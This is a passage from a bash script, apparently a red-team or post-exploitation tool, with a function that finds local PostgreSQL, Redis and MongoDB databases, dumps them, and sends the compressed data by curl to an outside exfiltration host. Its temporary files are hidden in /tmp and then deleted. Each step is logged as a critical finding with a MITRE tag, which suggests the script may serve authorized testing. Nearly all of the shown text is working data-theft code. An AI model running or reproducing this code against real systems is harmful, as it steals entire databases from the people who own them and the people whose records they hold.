                done
                add_vuln "RT-745" "CRITICAL" "MySQL Data Exfil" "MySQL databases dumped and exfiltrated" "exfil" "full" "MITRE T1005"
            fi
        fi
        
        # PostgreSQL dump attempt
        if command -v pg_dump &>/dev/null; then
            local PG_DBS
            PG_DBS=$(psql -l 2>/dev/null | grep -E '^\s+\w+' | awk '{print $1}' | grep -v '|' | head -10)
            if [[ -n "$PG_DBS" ]]; then
                echo -e "    $RED[+] PostgreSQL databases:$NC"
                echo "$PG_DBS" | while read -r db; do
                    pg_dump "$db" 2>/dev/null | gzip | curl -sk -X POST "https://$EXFIL_HOST:$EXFIL_PORT/db" --data-binary @- -H "X-DB: pg-$db" --connect-timeout 30 2>/dev/null && \
                        echo -e "            $RED[+] Database $db dumped and exfiltrated$NC"
                done
                add_vuln "RT-745" "CRITICAL" "PostgreSQL Exfil" "PostgreSQL databases dumped and exfiltrated" "exfil" "full" "MITRE T1005"
            fi
        fi
        
        # Redis dump
        if command -v redis-cli &>/dev/null; then
            redis-cli --raw KEYS '*' 2>/dev/null | head -50 > /tmp/.redis_dump.txt 2>/dev/null
            if [[ -s /tmp/.redis_dump.txt ]]; then
                curl -sk -X POST "https://$EXFIL_HOST:$EXFIL_PORT/db" --data-binary @/tmp/.redis_dump.txt -H "X-DB: redis" --connect-timeout 10 2>/dev/null
                echo -e "    $RED[+] Redis keys exfiltrated$NC"
                rm -f /tmp/.redis_dump.txt 2>/dev/null
                add_vuln "RT-745" "CRITICAL" "Redis Exfiltration" "Redis database keys exfiltrated" "exfil" "full" "MITRE T1005"
            fi
        fi
        
        # MongoDB dump
        if command -v mongodump &>/dev/null; then
            mongodump --out /tmp/.mongodump 2>/dev/null
            if [[ -d /tmp/.mongodump ]]; then
                tar czf - /tmp/.mongodump 2>/dev/null | curl -sk -X POST "https://$EXFIL_HOST:$EXFIL_PORT/db" --data-binary @- -H "X-DB: mongo" --connect-timeout 60 2>/dev/null && \
                    echo -e "    $RED[+] MongoDB dumped and exfiltrated$NC"
                rm -rf /tmp/.mongodump 2>/dev/null
                add_vuln "RT-745" "CRITICAL" "MongoDB Exfil" "MongoDB dumped and exfiltrated" "exfil" "full" "MITRE T1005"
            fi
        fi
    else
        echo -e "    $YELLOW[-] No running database servers found$NC"
    fi
}

